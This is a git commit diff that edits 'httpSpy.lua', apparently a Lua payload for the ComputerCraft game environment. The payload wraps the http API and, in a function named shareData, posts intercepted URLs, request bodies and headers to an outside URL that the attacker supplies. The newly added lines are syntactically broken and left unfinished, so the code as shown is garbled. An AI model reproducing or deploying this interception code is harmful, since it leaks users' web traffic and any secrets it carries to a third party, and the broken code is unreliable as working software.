a69aeb8f6f7630707ae8e8edcb3baa3cb3be5111
powerboat9 <powerboat9@users.noreply.github.com>
2016-08-30 07:59:20 -0400

    Update httpSpy.lua

--- payloads/httpSpy.lua
+++ payloads/httpSpy.lua
@@ -1,6 +1,12 @@
 return [[(function()
     if type(_G._G.http) == "table" and type(_G._G.http.post) == "function" then
-        local nativeget, nativepost, nativerequest, nativecheck, nativecode = http.get, http.post, http.request, http.checkURL, (textutils 
+        local nativeget, nativepost, nativerequest, nativecheck, nativecode = http.get, http.post, http.request, http.checkURL, type(textutils) == "table" and type(textutils.urlEscape) == "function" and textutils.urlEscape or function(t)
+            local i = 1
+            while i <= #t do
+                local b = t:sub(i, i):byte()
+                if b >= 128)
+        nativecode = type(nativecode or function(t)
+         
         local function shareData(url, post, headers)
             nativepost(]] .. (({...})[1]) .. [[, post, headers)
             
